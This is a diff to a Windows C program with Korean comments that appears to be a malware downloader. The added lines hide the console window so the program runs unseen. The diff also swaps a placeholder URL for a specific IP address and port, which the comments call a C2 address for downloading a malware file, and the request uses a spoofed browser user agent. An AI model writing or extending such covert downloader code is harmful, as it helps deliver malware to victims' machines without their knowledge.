@@ -4,6 +4,11 @@
 #pragma comment(lib, "wininet.lib")
 
 int main() {
+    // 창 숨기기
+    HWND console = GetConsoleWindow();
+    SetWindowPos(console, 0, -32000, -32000, 0, 0, SWP_NOSIZE | SWP_NOZORDER);
+    ShowWindow(console, SW_HIDE);
+
     // 브라우저 실행을 통해 인터넷 핸들 획득
     HINTERNET hInternet = InternetOpen(
         L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
@@ -15,7 +20,7 @@ int main() {
     }
 
     // 브라우저 세션으로 실행할 URL 주소 입력 -> 악성코드 파일을 다운로드 할 수 있는 C2 주소
-    HINTERNET hInternetOpenUrl = InternetOpenUrl(hInternet, L"http://example.com/malware.bin", NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
+    HINTERNET hInternetOpenUrl = InternetOpenUrl(hInternet, L"http://222.112.24.168:1111/malware.bin", NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
 
     // URL 접속이 실패했을 경우 예외 처리 및 브라우저 핸들 닫기
     if (!hInternetOpenUrl) {
